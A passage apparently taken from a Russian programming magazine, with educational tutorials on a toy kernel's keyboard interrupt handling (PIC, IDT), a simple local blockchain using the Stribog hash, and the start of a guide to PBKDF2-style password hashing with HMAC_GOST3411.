и out, входящих в набор x86.
  В read_port номер порта передается в качестве аргумента. Когда ком‐
пилятор вызывает функцию, он кладет все аргументы в стек. Аргумент копиру‐
ется в регистр edx при помощи ука зателя на стек. Регистр dx — это ниж‐
ние 16 бит регистра edx. Инс трукция in здесь чита ет порт, номер которого
задан в dx, и кладет результат в al. Регистр al — это нижние 8 бит регистра
eax. Возможно, ты помнишь из институтского курса, что значения, возвра‐
щаемые функциями, передаются через регистр eax. Таким образом, read_‐
port позволяет нам читать из портов ввода‐вывода.
  Функция write_port работает схожим обра зом. Мы принимаем два аргу‐
мента: номер пор та и данные, которые будут записаны. Инс трукция out
пишет данные в порт.


ПРЕРЫВАНИЯ
Теперь, прежде чем мы вернемся к написа нию драйвера, нам нужно понять,
как процессор узнает, что какое‐то из устройств выполнило операцию.
  Самое простое решение — это опрашивать устройства — непрерывно
по кругу проверять их ста тус. Это по очевидным причинам неэффективно
и непрактично. Поэтому здесь в игру всту пают прерывания. Прерывание —
это сигнал, посылаемый процессору устрой ством или программой, который
означает, что произошло событие. Используя прерывания, мы можем избе‐
жать необходимости опра шивать устройства и будем реагировать только
на интересующие нас события.
  За прерывания в архитектуре x86 отвечает чип под названием Pro‐
grammable Interrupt Controller (PIC). Он обрабатывает хардверные прерыва‐
ния и направляет и превращает их в соответству ющие системные прерыва‐
ния.
   Когда пользователь что‐то делает с устройством, чипу PIC отправляется
импульс, называемый зап росом на прерывание (Interrupt Request, IRQ). PIC
переводит полученное прерывание в системное прерывание и отправляет
процессору сооб щение о том, что пора оста новить то, что он делает. Даль‐
нейшая обработка прерываний — это задача ядра.
   Без PIC нам бы пришлось опра шивать все устрой ства, присутству ющие
в системе, чтобы посмотреть, не произошло ли событие с участием какого‐то
из них.
  Давай разберем, как это работает в случае с клавиатурой. Клавиатура
висит на портах 0x60 и 0x64. Порт 0x60 отда ет данные (когда нажата какая‐то
кнопка), а порт 0x64 передает статус. Одна ко нам нужно знать, когда конкрет‐
но читать эти порты.
  Прерывания здесь приходят ся как нельзя более кстати. Когда кнопка
нажата, клавиатура отправляет PIC сигнал по линии прерываний IRQ1. PIС
хранит значение offset, сохраненное во время его инициализации. Он
добавляет номер входной линии к это му отсту пу, чтобы сформировать вектор
прерывания. Затем процес сор ищет структуру данных, называемую «таблица
векторов прерываний» (Interrupt Descriptor Table, IDT), чтобы дать функции —
обработчику пре рывания адрес, соответс твующий его номеру.
  Затем код по этому адресу исполня ется и обрабатывает прерывание.


ЗАДАЕМ IDT
struct IDT_entry{
    unsigned short int offset_lowerbits;
    unsigned short int selector;
    unsigned char zero;
    unsigned char type_attr;
    unsigned short int offset_higherbits;
};
struct IDT_entry IDT[IDT_SIZE];
void idt_init(void)
{
    unsigned long keyboard_address;
    unsigned long idt_address;
    unsigned long idt_ptr[2];
    keyboard_address = (unsigned long)keyboard_handler;
    IDT[0x21].offset_lowerbits = keyboard_address & 0xffff;
    IDT[0x21].selector = 0x08; /* KERNEL_CODE_SEGMENT_OFFSET */
    IDT[0x21].zero = 0;
    IDT[0x21].type_attr = 0x8e; /* INTERRUPT_GATE */
    IDT[0x21].offset_higherbits = (keyboard_address & 0xffff0000) >>
16;
    write_port(0x20 , 0x11);
    write_port(0xA0 , 0x11);
    write_port(0x21 , 0x20);
    write_port(0xA1 , 0x28);
    write_port(0x21 , 0x00);
    write_port(0xA1 , 0x00);
    write_port(0x21 , 0x01);
    write_port(0xA1 , 0x01);
    write_port(0x21 , 0xff);
    write_port(0xA1 , 0xff);
    idt_address = (unsigned long)IDT ;
    idt_ptr[0] = (sizeof (struct IDT_entry) * IDT_SIZE) + ((idt_ad
dress & 0xffff) << 16);
    idt_ptr[1] = idt_address >> 16 ;
    load_idt(idt_ptr);
}

IDT — это массив, объединяющий структуры IDT_entry. Мы еще обсу дим при‐
вязку  клавиатурного прерывания  к обработчику, а сейчас посмотрим,
как работает PIC.
  Современные системы x86 имеют два чипа PIC, у каждого восемь входных
линий. Будем называть их PIC1 и PIC2. PIC1 получает от IRQ0 до IRQ7,
а PIC2 — от IRQ8 до IRQ15. PIC1 использует порт 0x20 для команд
и 0x21 для данных, а PIC2 — порт 0xA0 для команд и 0xA1 для данных.
  Оба PIC инициализируются восьмибитными словами, которые называются
«командные слова инициализации» (Initialization command words, ICW).
  В защищенном режиме обо им PIC первым делом нужно отдать команду
инициализации ICW1 (0x11). Она сообщает PIC, что нужно ждать еще трех
инициализационных слов, которые придут на порт данных.
   Эти команды передадут PIC:
 • вектор отступа (ICW2),
 • какие между PIC отно шения master/slave (ICW3),
 • дополнительную информа цию об окру жении (ICW4).

Вторая команда инициализации (ICW2) тоже шлется на вход каждого PIC. Она
назначает offset, то есть значение, к которому мы добавляем номер линии,
чтобы получить номер прерывания.
   PIC разрешают каскадное перенаправление их выводов на вводы друг
друга. Это делается при помощи ICW3, и каж дый бит пред ставляет каскадный
статус для соответствующего IRQ. Сейчас мы не будем использовать кас‐
кадное перенап равление и выставим нули.
  ICW4 задает допол нительные парамет ры окру жения. Нам нужно опре‐
делить только нижний бит, чтобы PIC зна ли, что мы работаем в режиме 80x86.
   Та‐дам! Теперь PIC проинициализированы.
   У каждого PIC есть внутренний восьмибитный регистр, который называ‐
ется «регистр масок прерываний» (Interrupt Mask Register, IMR). В нем хранит‐
ся битовая карта линий IRQ, которые идут в PIC. Если бит задан, PIC игно‐
рирует запрос. Это значит, что мы можем вклю чить или выключить опре‐
деленную линию IRQ, выставив соответству ющее зна чение в 0 или 1.
   Чтение из пор та данных возвращает зна чение в регистре IMR, а запись —
меняет регистр. В нашем коде пос ле ини циализации PIC мы выставляем все
биты в единицу, чем деактивируем все линии IRQ. Поз днее мы активируем
линии, которые соот ветс тву ют клавиатурным прерыва ниям. Но для начала все
же выключим!
   Если линии IRQ работают, наши PIC могут получать сигналы по IRQ и пре‐
образовывать их в номер прерывания, добавляя офсет. Нам же нужно запол‐
нить IDT таким образом, чтобы номер прерывания, пришедшего с клавиату ры,
соответствовал адресу функции‐обработчика, которую мы напишем.
  На какой номер прерывания нам нужно завязать в IDT обработчик кла‐
виатуры?
   Клавиатура исполь зует IRQ1. Это входная линия 1, ее обрабаты вает PIC1.
Мы проинициализировали PIC1 с офсетом 0x20 (см. ICW2). Чтобы получить
номер прерывания, нужно сло жить 1 и 0x20, получится 0x21. Значит, адрес
обработчика клавиатуры будет завязан в IDT на прерывание 0x21.
  Задача сводится к тому, чтобы заполнить IDT для прерывания 0x21. Мы
замапим это прерывание на функцию keyboard_handler, которую напишем
в ассемблерном файле.
  Каждая запись в IDT состоит из 64 бит. В записи, соответс твующей пре‐
рыванию, мы не сох раняем адрес функции‐обра ботчика целиком. Вместо
этого мы разбиваем его на две части по 16 бит. Нижние биты сохраня ются
в первых 16 битах записи в IDT, а старшие 16 бит — в последних 16 битах
записи. Все это сделано для совместимости с 286‐ми процессорами.
Как видишь, Intel выделывает такие номера на регулярной основе и во мно‐
гих‐многих местах!
  В записи IDT нам осталось прописать тип, обоз начив таким образом, что
все это делается, чтобы отло вить прерыва ние. Еще нам нужно задать офсет
сегмента кода ядра. GRUB зада ет GDT за нас. Каждая запись GDT имеет дли‐
ну 8 байт, где дескриптор кода ядра — это второй сегмент, так что его офсет
составит 0x08 (подробности не влезут в эту статью). Гейт прерывания пред‐
ставлен как 0x8e. Оставшиеся в середине 8 бит запол няем нулями. Таким
образом, мы запол ним запись IDT, которая соответствует клавиатурному пре‐
рыванию.
   Когда с маппингом IDT будет покончено, нам надо будет сообщить про‐
цессору, где находится IDT. Для этого существу ет ассемблерная инструкция
lidt, она принимает один операнд. Им служит ука затель на дес криптор струк‐
туры, которая описывает IDT.
  С дескриптором никаких сложностей. Он содержит размер IDT в байтах
и его адрес. Я исполь зовал мас сив, чтобы вышло компактнее. Точно так же
можно заполнить дескриптор при помощи структуры.
  В переменной idr_ptr у нас есть указатель, который мы передаем инс‐
трукции lidt в функции load_idt().


load_idt:
    mov edx, [esp + 4]
    lidt [edx]
    sti
    ret

Дополнительно функция load_idt() воз вра щает пре рывание при исполь‐
зовании инструкции sti.
  Заполнив и загрузив IDT, мы можем обра титься к IRQ клавиатуры, исполь‐
зуя маску прерывания, о которой мы говорили ранее.


void kb_init(void)
{
    write_port(0x21 , 0xFD);
}

0xFD — это 11111101 — вклю чаем только IRQ1 (клавиату ру).


ФУНКЦИЯ — ОБРАБОТЧИК ПРЕРЫВАНИЯ КЛАВИАТУРЫ
Итак, мы успешно привяза ли прерывания клавиатуры к функции keyboard‐
_handler, создав запись IDT для прерыва ния 0x21. Эта функция будет
вызываться каждый раз, когда ты нажимаешь на какую‐нибудь кнопку.


keyboard_handler:
    call    keyboard_handler_main
    iretd

Эта функция вызывает дру гую функцию, написанную на C, и воз вращает
управление при помощи инструкций класса iret. Мы могли бы тут написать
весь наш обработчик, но на C кодить зна чительно легче, так что перекатыва‐
емся туда. Инструкции iret/iretd нужно использовать вместо ret, когда
управление возвращается из функции, обра батывающей прерывание, в прог‐
рамму, выполнение которой было им прервано. Этот класс инструкций под‐
нимает флаговый регистр, который попадает в стек при вызове прерывания.


void keyboard_handler_main(void) {
    unsigned char status;
    char keycode;
    /* Пишем EOI */
    write_port(0x20, 0x20);
    status = read_port(KEYBOARD_STATUS_PORT);
    /* Нижний бит статуса будет выставлен, если буфер не пуст */
    if (status & 0x01) {
        keycode = read_port(KEYBOARD_DATA_PORT);
        if(keycode < 0)
            return;
        vidptr[current_loc++] = keyboard_map[keycode];
        vidptr[current_loc++] = 0x07;
    }
}

Здесь мы сначала даем сигнал EOI (End Of Interrupt, окончание обработки
прерывания), записав его в командный порт PIC. Толь ко после этого PIC раз‐
решит дальнейшие запросы на прерыва ние. Нам нужно читать два порта:
порт данных 0x60 и порт команд (он же status port) 0x64.
  Первым делом читаем порт 0x64, чтобы получить статус. Если нижний бит
статуса — это ноль, значит, буфер пуст и данных для чте ния нет. В других слу‐
чаях мы можем читать порт данных 0x60. Он будет выдавать нам код нажатой
клавиши. Каждый код соответствует одной кноп ке. Мы используем прос той
массив сим волов, заданный в файле keyboard_map.h, чтобы привязать коды
к соответствующим символам. Затем символ выводится на экран при помощи
той же техники, что мы применяли в первой версии ядра.
   Чтобы не усложнять код, я здесь обрабатываю только строчные буквы от a
до z и цифры от 0 до 9. Ты с легкостью можешь добавить спецсимволы, Alt,
Shift и Caps Lock. Узнать, что клавиша была нажата или отпущена, можно
из вывода командного порта и выполнять соответствующее действие. Точно
так же можешь привязать любые сочетания клавиш к специальным функци ям
вроде выключения.
   Теперь ты можешь собрать ядро, запус тить его на реальной машине
или на эмуляторе (QEMU) так же, как и в первой части.
  И начинай печатать!
 КОДИНГ





   Евгений Дроботун
Постоянный автор рубрики
        Malware


РУССКИЙ
НАРОДНЫЙ
БЛОКЧЕЙН
 ПИШЕМ ПРОСТОЙ
 ЛОКАЛЬНЫЙ БЛОКЧЕЙН
 С ИСПОЛЬЗОВАНИЕМ «СТРИБОГА»




 Блокчейн и все, что с ним связано, нынче у всех на слуху,
 и на сегодняшний день вряд ли можно найти издание,
 которое обошло  эту тему своим вниманием. Мы тоже
 не оставались в стороне и в свое время подробно разоб‐
 рались, что собой представ ляет блокчейн, зачем он нужен
 и что можно с ним делать. Сегодня мы попробуем рассмот‐
 реть данную тему с практической стороны и напишем прос‐
 тейший локальный блокчейн. Сразу ого ворюсь, что до пол‐
 ноценного блокчейн‐проекта ему далеко, однако с его
 помощью вполне можно получить общее представление
 о том, как работает эта тех нология изнутри.


 ОБЩАЯ СТРУКТУРА НАШЕГО БЛОКЧЕЙНА
  Итак, наш блокчейн (как и положено) будет представлять собой цепочку
  из блоков, каждый из которых включает в себя следующее:
   • номер блока [index];
   • метка времени [timestamp];
   • содержание транзакции [transaction];
   • значение так называемо го доказа тельства работы [proof] (о том, что
     это такое, чуть ниже);
   • значение хеш‐суммы предыдущего блока [previous hash];
   • значение хеш‐суммы текущего блока [hash].

 В содержание транзакции мы включим отпра вителя денежных средств [
  sender], имя получателя этих средств [recipient] и количество переданных
  денежных средств [amount]. Для простоты в блок будем включать све дения
  только об одной транзакции.
   Общая структура блока, таким обра зом, будет выглядеть вот так:


  block = {
    'index': 2,
    'timestamp': 1527444458,
    'transactions': [
      {
        'sender': "Petrov",
        'recipient': "Ivanov",
        'amount': 15418,
      }
    ],
    'proof': 4376,
    'previous hash': "000bdf8cd989eb26be64a07b80a8cdcaf27476d847
  3efbde66c9dd857b94ab9",
    'hash' : "00e86d5fce9d492c8fac40762fa3f4eee9a4ae4a17ee834be69
  aa05dff1309cc"
  }

 Помимо очередных текущих блоков, блокчейн дол жен включать в себя
  начальный (или первый) блок, с которого, собственно говоря, и начинается
  вся цепочка блоков. Этот блок называется genesis‐блоком, и он, в отличие
  от текущих блоков, содержит в себе только номер (который всегда равен
  нулю), метку вре мени, какое‐либо рандомное значение вместо хеш‐суммы
  предыдущего блока (пос кольку genesis‐блок первый и предыдущего блока
  у него просто‐напросто нет) и собственное зна чение хеш‐суммы:


  genesisblock = {
    'index': 0,
    'timestamp': 1527443257,
    'random hash': "f2fcc3da79c77883a11d5904e53b684ded8d6bb4b5bc73370df
  e7942c1cd7ebf",
    'hash' : "3fe4364375ef31545fa13aa94ec10abdfdead26307027cf2905
  73a249a209a62"
  }

 В целом наш блокчейн будет выглядеть следующим образом.





                 Об щая схема нашего блокчейна


 ФУНКЦИЯ ПОДСЧЕТА ХЕШ-СУММЫ
 Поскольку для подсчета хешей мы соб рались исполь зовать алгоритм «Стри‐
  бог» (про который мы уже писали), нам необ ходима соответству ющая фун‐
  кция. Ее мы напишем, используя код из ука занной статьи. Качаем его отсюда
  и подключаем в наш проект нужные фай лы следующей строчкой:


  # include "gost_3411_2012/gost_3411_2012_calc.h"

 Саму функцию объявим так:


  std::string get_hash_stribog(std::string str)

 Далее объявляем  структуру для хра нения результатов подсчета хешей
  и выделяем для нее память:


  ...
  TGOSTHashContext *CTX;
  CTX = (TGOSTHashContext*)(malloc(sizeof(TGOSTHashContext)));
  ...

 Поскольку в теле блока зна чения хеш‐сумм представлены в виде строк, то
  функция должна получить на вход содержимое блока в виде строки. Для этого
 напишем следующее:


  ...
  // Преобразуем строку входных данных к виду const char
  const char *c = str.c_str();
  // Формируем буфер для входных данных и копируем в него входные
  данные
  uint8_t *in_buffer;
  in_buffer = (uint8_t *)malloc(str.size());
  memcpy(in_buffer, c, str.size());
  ...

 Далее считаем хеш:


  ...
  GOSTHashInit(CTX, HASH_SIZE);
  GOSTHashUpdate(CTX, in_buffer, str.size());
  GOSTHashFinal(CTX);
  ...

 Поскольку выход функции тоже должен быть в виде строки, а рассчитанное
  значение хеша представлено в виде байтового массива, нам необходимо
  сделать соответствующее преобразова ние. Сделаем это следующим обра‐
  зом (HASH_SIZE — длина хеш‐суммы, 512 или 256 бит, выберем 256):


  ...
  // Формируем буфер для выходных данных
  char out_buffer[2 * (HASH_SIZE / 8)];
  // Пишем в буфер значение хеш‐суммы
  for (int i = 0; i < HASH_SIZE / 8; i++)
    sprintf(out_buffer + i * 2, "%02x", CTX‐>hash[i]);
  // Не забываем освободить выделенную память
  free(CTX);
  free(in_buffer);
  // Возвращаем строку с хеш‐суммой
  return std::string((const char *)out_buffer);

 Функция по расчету хешей у нас готова, можно писать дальше.


 ФАЙЛ BLOCK.H
 В этом файле опишем класс CBlock, в который войдет все, что нам нужно
  для создания бло ка (как очередного, так и genesis‐блока). Однако прежде
  чем описывать сам класс, определим структуру, которая будет описывать
  транзакцию. Как мы уже решили, транзакция будет включать в себя три
  поля — отправитель, получатель и сумма транзакции:


  struct STransaction {
    std::string sender;
    std::string recipient;
    uintmax_t amount;
  };

  Теперь можно приступить к описанию нашего клас са CBlock. В него входит
  public‐секция, вклю чающая два конструктора (тот, который без параметров,
  служит для инициализации genesis‐блока, а тот, который с параметрами, —
  для инициализации очередных блоков); метод, создающий genesis‐блок;
  метод, с помощью которого будет майниться очередной блок; метод, записы‐
 вающий значение хеша предыду щего блока в нужное место текущего блока;
  метод получения значения хеша бло ка из соответству ющего поля и private‐
  секция со всеми необ ходимыми полями (номер блока, имя блока, метка вре‐
  мени и так далее) и одним методом под счета хеш‐суммы:


  class CBlock {
    public:
      CBlock();
      CBlock(uint32_t index_in, const std::string &in_name_block, const
   std::string &in_sender,
        const std::string &in_recipient, uintmax_t in_amount);
      void create_genesis_block();
      void mine_block(uint32_t diff);
      void set_previous_hash(std::string in_previous_hash);
      std::string get_hash();
    private:
      uintmax_t index; // Номер блока
      std::string name_block; // Имя блока
      time_t time_stamp; // Метка времени
      STransaction transaction; // Транзакция
      uintmax_t proof; // Доказательство выполнения работы
      std::string previous_hash; // Хеш предыдущего блока
      std::string hash; // Хеш текущего блока
      std::string calc_hash() const; // Метод подсчета хеша
  };

  Теперь можно написать реализацию всех ука занных методов. Все это мы
  поместим в файл block.cpp.


 ФАЙЛ BLOCK.CPP
 В начале не забудем написать


  # include "block.h"


 Конструк тор для инициализации genesis-бло ка
  Как было сказано выше, конструктор без парамет ров нужен для ини циали‐
  зации genesis‐блока. Поле, содержащее метку времени, инициализируется
  значением текущего времени, поле с именем блока — строкой «Genesis
  block», все остальное по нулям:


  CBlock::CBlock() : index(0), name_block("Genesis block"), transaction
   {"None", "None", 0}, proof(0){
    time_stamp = time(nullptr);
  }


 Конструк тор для инициализации оче ред ного бло ка
  Здесь мы инициализиру ем все поля нужными значениями (очеред ной номер
  блока, имя блока, например «Current block», зна чения полей транзакции и так
  далее):


  CBlock::CBlock(uint32_t index_in, const std::string &in_name_block,
  const std::string &in_sender, const std::string &in_recipient, uintma
  x_t in_amount) : index(index_in), name_block(in_name_block), transa
  ction {in_sender, in_recipient, in_amount}, proof(0) {
    time_stamp = time(nullptr);
  }


 Соз даем genesis-блок
 Основное, что нужно сделать, — это сгенери ровать рандомное значение
  хеша для записи его в место, предназначенное для хеша предыдущего блока.


  void CBlock::create_genesis_block(){
    // Инициализируем ГСЧ текущим временем
    srand(time(nullptr));
    // Заносим в строку случайное число
    std::stringstream ss;
    ss << rand();
    // В нужное поле заносим хеш, посчитанный из рандомной строки
    previous_hash = get_hash_stribog(ss.str());
    // Считаем хеш genesis‐блока
    hash = calc_hash();
  }


 Майним оче ред ной блок
 Основная цель майнинга — сделать так, чтобы формирование очередного
  блока было некоторым обра зом затратным (в общем случае требовало вре‐
  мени и значительных вычислительных ресурсов). Для этого реализуем алго‐
  ритм доказательства работы  (Proof of work) по ана логии с большинством
  известных криптовалют. Суть это го алгоритма заключается в переборе под‐
  считанных хеш‐сумм блока, пока не выполнится определенное условие.
    Для того чтобы значения хеш‐суммы бло ка при каждой ите рации подсчета
  были разными, нужно каждую итерацию каким‐то образом менять что‐либо
  в содержимом блока. Для этого мы в описании клас са определили поле proof,
  значение которого каждую итерацию будем увеличивать на единицу. Усло‐
  вием, по которому будем прекращать итерационный подсчет хеш‐сумм,
  будет наличие в начале получившейся в резуль тате очередной ите рации
  хеш‐суммы определенного количес тва нулей.
   В общем случае чем большим количеством нулей в начале хеша мы
  зададимся, тем большее количес тво итераций необходимо проделать, чтобы
  получился искомый хеш. Количес тво нулей в начале хеша определяется уров‐
 нем сложности diﬀ.





          Общая схема доказательства работы (Proof of work)

 Исходя из всего этого, метод, реализующий майнинг блока, напишем сле‐
 дующим образом:


  void CBlock::mine_block(uint32_t diff){
    // Делаем строку из нулей размером в diff
    char zero_ch[diff];
    memset(zero_ch, '0', diff);
    zero_ch[diff] = '\0';
    std::string zero_str(zero_ch);
    // Делаем итерационный подсчет хеша, пока не получим нужное
  количество нулей в начале
    do {
      hash = calc_hash();
      proof++;
    } while (hash.substr(0, diff) != zero_str);
  }


 Считаем хеш оче ред ного бло ка
 В предыдущем методе использовался метод calc_hash(), с помощью которо‐
  го и осуществляется подсчет хеш‐суммы бло ка. Тут все просто — содер‐
 жимое блока засовываем в одну стро ку и с помощью функции get_hash_stri‐
  bog(), которую мы описали в самом начале, получаем искомое значение хеша
  от получившейся строки:


  std::string CBlock::calc_hash() const {
    std::stringstream ss;
    ss << index << time_stamp << transaction.sender << transaction.
  recipient << transaction.amount << proof << previous_hash;
    return get_hash_stribog(ss.str());
  }


 Записы ваем в блок значение хеша пре дыду щего бло ка
  Здесь все просто, обычный сеттер:


  void CBlock::set_previous_hash(std::string in_previous_hash){
    previous_hash = in_previous_hash;
  }


 Читаем значение хеша бло ка из поля hash
  Здесь также все очень просто:


  std::string CBlock::get_hash(){
    return hash;
  }

  Итак, класс CBlok, из которо го в дальнейшем мы будем делать блоки, мы опи‐
  сали и реализовали, теперь нужно эти блоки скла дывать в цепочку. Для этого
 напишем класс CBlockchain.


 ФАЙЛ BLOCKCHAIN.H
 В начале подключим описание класса CBlock:


  # include "block.h"

 В public‐секцию класса запишем:
   • конструктор с входным параметром in_diff, задающим сложность май‐
    нинга блоков;
   • метод, добавляющий в блокчейн genesis‐блок;
   • метод, добавляющий в блокчейн очередной блок.

 В private‐секцию определим:
   • поле, в котором будем хранить зна чение сложности май нинга;
   • поле, в котором будем хра нить цепочку наших блоков, представляющее
    динамический массив типа vector (чтобы это сделать, не забудь под клю‐
     чить соответствующую библиотеку vector.h);
   • метод, возвращающий предыду щий блок из цепочки, для того чтобы
    вытащить из него хеш‐сумму.

 Получаем следующий код:


  class CBlockchain {
    public:
      CBlockchain(uint32_t in_diff);
      void add_genesis_block(CBlock new_block);
      void add_block(CBlock new_block);
    private:
      uint32_t diff; // Сложность майнинга
      std::vector<CBlock> chain; // Цепочка блоков
      CBlock get_last_block() const;
  };

  Класс CBlockchain описан, можно писать его реализацию.


 ФАЙЛ BLOCKCHAIN.CPP
 В первой строчке подключим только что написанный blockchain.h:


  # include "blockchain.h"


 Инициализиру ем блок чейн
  Конструктор класса включает одну стро ку, в которой очищается массив
  для хранения блоков.


  CBlockchain::CBlockchain(uint32_t in_diff) : diff(in_diff){
    chain.clear();
  }


 До бавляем genesis-блок
 В метод для добавления genesis‐блока запишем функцию его создания
  из класса CBlock, после чего созданный блок помещаем в начало массива
  для хранения блоков:


  void CBlockchain::add_genesis_block(CBlock new_block){
    new_block.create_genesis_block();
    chain.emplace_back(new_block);
  }


 До бавляем оче ред ной блок
 В этом методе получаем хеш предыду щего блока, майним очередной блок (с
  учетом поля diﬀ) и помещаем смайненный блок в мас сив:


  void CBlockchain::add_block(CBlock new_block){
    // Пишем в нужное место хеш‐сумму предыдущего блока
    new_block.set_previous_hash(get_last_block().get_hash());
    // Майним очередной блок
    new_block.mine_block(diff);
    // Помещаем его в цепочку блоков
    chain.push_back(new_block);
  }

  Здесь используется метод get_last_block(), воз вращающий пре дыдущий
  блок, чтобы из него можно было прочитать значение его хеш‐суммы.
  Написать его особых сложностей не представляет:


  CBlock CBlockchain::get_last_block() const {
    return chain.back();
  }

  Запустив получившийся блокчейн у себя на компьютере, я попробовал смай‐
  нить три блока с разными уровнями сложности майнинга. Для сложности,
  равной шести, три блока майнились немного меньше часа. Для семерки один
  блок майнился около полуто ра часов, дальше экспериментировать у меня
  терпения не хватило.





   Результаты майнинга трех блоков (с уровнем сложности, равным шести,
    три блока майнились пять десят минут)

 Диспетчер задач при этом показывал, что основные усилия процессора нап‐
  равлены исключительно на решение задачи Proof of work.





   Диспетчер задач сигнализирует, что на данный момент самая затратная
    задача — майнинг блоков


 ЗАКЛЮЧЕНИЕ
  Конечно, мы упростили и не учли очень многое: и распре деленность самого
  блокчейна, и процедуры дос тижения консенсуса, и возможность включения
  большего количества транзакций в один блок, и подтверждение целостности
  этих транзакций с помощью деревь ев Меркла, да и много чего еще...
 Но во‐первых, в одну статью это все никак не уместить, а во‐вторых, цель
  статьи все‐таки немного другая — положить начало в не совсем легком,
  но весьма интересном деле осво ения этого перспективного направления.
  Дальше качай White Paper Bitcoin (в том чис ле и на рус ском), исходники Bit‐
  coin и Ethereum, читай, вникай, разбирайся.


         WWW

                       •Весь код нашего блок чейна в виде проекта
                          на Qt
КОДИНГ
 ДАО ХЕША





                                        Евгений Дроботун
                                         Постоянный автор рубрики
                                                   Malware





          ПОЗНАЕМ ДЗЕН
     МЕТОДИЧЕСКИ ПРАВИЛЬНОГО
       ХЕШИРОВАНИЯ ПАРОЛЕЙ




Наверняка тебе известно, что хорошая система контроля
доступа, основанная на вводе и проверке правильности
пароля, никогда и нигде не сох раняет пароли в открытом
виде,  а  проверяет  введенный  пользователем  пароль
с  использованием  хеш‐суммы  этого  пароля.  А  очень
хорошие сис темы еще и добав ляют к ним «соль» — случай‐
ную строку, которая для каждого пользователя уникальна.
В этой статье мы на практике рассмотрим вопросы правиль‐
ного хеширования паролей, руководствуясь при этом акту‐
альными рос сийскими методическими рекомен дациями.


Как выглядят записи в базе данных пользователей «хороших сис тем контроля
доступа»? Примерно так (здесь видны имя учет ной записи пользователя, зна‐
чение соли и значение хеша):


...
"Ivanov"  "QxLUF1bgIAdeQX" c9e209040c863f84a31e719795b25775239547
"Petrov"  "bv5PehSMfV11Cd" d1d3ec2e6f20fd420d50e2642992841d8338a3
"Sidorov" "YYLmfY6IehjZMQ" a49670c3c18b9e079b9cfaf51634f563dc88ed
...

Таким образом, на основе введенного пользователем пароля и соответс тву‐
ющего ему значения соли с помощью того или ино го алгоритма вычисляется
хеш. Далее он сравнивается с записанным в базе: если они совпадают, поль‐
зователь допускается в систему, если не совпадают, пользователю в допуске
будет отказано. Все, в общем‐то, совсем не сложно. Главный вопрос зак‐
лючается в том, каким образом и каким алгоритмом считать этот самый хеш
из значений вве денного пароля и соли. Если как следует порыться в весьма
объемном ворохе отечественных нормативно‐методических документов, пос‐
вященных криптографии, то можно обнаружить документ, который поможет
нам дать ответ на этот вопрос.
  Документ называется «Рекомендации по стандарти зации Р 50.1.111—
2016. Информационная технология. Криптогра фичес кая защита информации.
Парольная защита клю чевой информа ции». Он разработан техническим
комитетом по стандартизации ТК 26 «Криптогра фичес кая защита информа‐
ции» и представляет собой расширение меж дународного стандарта PKCS #5
Version 2.0 (Public Key Cryptography Standart: Password‐Based Cryptography
Speciﬁcation): в процедуру хеширования, описанную в PKCS #5, внесена воз‐
можность использовать алго ритм из ГОСТ Р 34.11—2012 (да‐да, это тот
самый «Стрибог» — похоже, нынче без него никуда).


ОБЩАЯ СХЕМА И ИСХОДНЫЕ ДАННЫЕ
Основу алгоритма получения хеша составляет так называемая функция
диверсификации PBKDF версии 2.0 (Password‐Based Key Derivation Function).
Данная функция реализуется путем применения псевдослучайной хеш‐фун‐
кции к строке, в нашем случае к паролю, вместе с солью, процесс повторя‐
ется большое число раз.





            Общая схема выработ ки нужного нам хеша

В качестве псев дослучайной хеш‐функции мы будем использовать функцию
вычисления аутентификационного кода сооб щения HMAC_GOST3411 (Hash‐
based Message  Authentication Code) на основе, как ты уже догадался,
хеш‐функции «Стрибог». Исходные данные для алго ритма:
 • введенный пользователем пароль (длина не более 512 бит, или 64 байт);
 • значение соли (произволь ной длины);
 • число итераций (минимально допустимое значение — 1000, максимально
   допустимое — 4 294 967 295);
 • необходимая длина вычисляемого хеша.


ПСЕВДОСЛУЧАЙНАЯ ХЕШ-ФУНКЦИЯ HMAC_GOST3411
Сама функция HMAC_GOST3411 описана в дру гом нормативно‐методическом
документе Р 50.1.113—2016 и включает в себя следующие этапы:
 • дополнение нулями введенного пароля до длины в 64 байт (конечно, в том
   случае, если его длина меньше это го значения);
 • побайтовое сложение по модулю 2 получившегося на предыдущем этапе
   дополненного пароля с 64‐байтовой константой ipad, в которой каждый
   байт равен 0x36;
 • конкатенация получившегося на предыду щем этапе значения с солью
   и подсчет «стрибог»‐хеша из полученной строки;
 • конкатенация результата побайтового xor дополненного пароля с 64‐бай‐
   товой констан той opad (значение каждого байта равно 0x5c) с получив‐
  шимся на пре дыдущем этапе результатом;
 • подсчет «стрибог»‐хеша из результата предыду щего этапа.





                  Схема функции HMAC_GOST3411

Перед тем как писать код самой функции HMAC_GOST3411, необходимо
определить нужные константы ipad и opad и написать функцию подсчета
«стрибог»‐хеша байтового массива про извольной длины.


Определе ние кон стант
Поскольку в ходе подсчета зна чений хеш‐сумм мы оперируем 64‐байтовыми
блоками, то зададим размер это го блока:


#define BLOCK_SIZE 64

Константу ipad определим таким образом:


uint8_t i_pad[BLOCK_SIZE] = {
  0x36, 0x36, 0x36, 0x36, 0x36, ... , 0x36, 0x36
};

а константу opad таким:


uint8_t o_pad[BLOCK_SIZE] = {
  0x5c, 0x5c, 0x5c, 0x5c, 0x5c, ... , 0x5c, 0x5c
};

Для экономии места здесь константы описаны не полностью, на самом деле
каждая из них длиной по 64 байт.


Фун кция под сче та «стрибог»-хеша
Для начала скачаем и подклю чим нужные файлы (про них мы уже писали),
в которых реализованы базовые функции алгорит ма «Стрибог»:


#include "gost_3411_2012_calc.h"

Далее напишем саму функцию. На вход функции пода ется указатель на строку
с исходными дан ными, указатель на массив, куда будет записан искомый хеш,
длина искомого хеша (512 или 256 бит) и длина мас сива исходных данных:


static void
GetHashString(uint8_t *str, uint8_t *hash,
  int hash_size, size_t size_str)

Определяем структуру CTX для хранения всего, что нужно при подсчете хеша,
и выделяем для нее память:


TGOSTHashContext *CTX;
CTX = (TGOSTHashContext*)(malloc(sizeof(TGOSTHashContext)));

Создаем промежуточный буфер и записываем в него исходную строку:


uint8_t *buffer;
buffer = malloc(size_str);
memcpy(buffer, str, size_str);

Считаем хеш‐сумму и пишем результат в выходной байтовый массив:


GOSTHashInit(CTX, hash_size);
GOSTHashUpdate(CTX, buffer, size_str);
GOSTHashFinal(CTX);
memcpy(hash, CTX‐>hash, BLOCK_SIZE);


Пишем непосредствен но саму фун кцию HMAC_GOSTR3411
Объявим эту функцию таким обра зом:


static void
HMAC_GOSTR3411(const uint8_t *K, size_t size_K,
  const uint8_t *T, size_t size_T,
